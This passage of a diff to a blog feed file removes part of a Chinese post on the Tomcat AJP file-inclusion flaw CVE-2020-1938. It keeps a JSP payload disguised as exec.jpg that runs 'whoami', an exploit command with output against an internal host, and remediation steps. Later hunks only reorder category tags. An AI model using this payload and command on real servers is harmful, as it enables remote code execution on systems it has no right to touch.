-<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
-<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
-<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
-<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -3483,8 +3483,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>信息收集</category>
+        <category>主机发现</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -4450,11 +4450,11 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
         <category>嗅探</category>
         <category>内网渗透</category>
         <category>信息收集</category>
+        <category>主机发现</category>
         <category>Python</category>
         <category>编程</category>
       </categories>
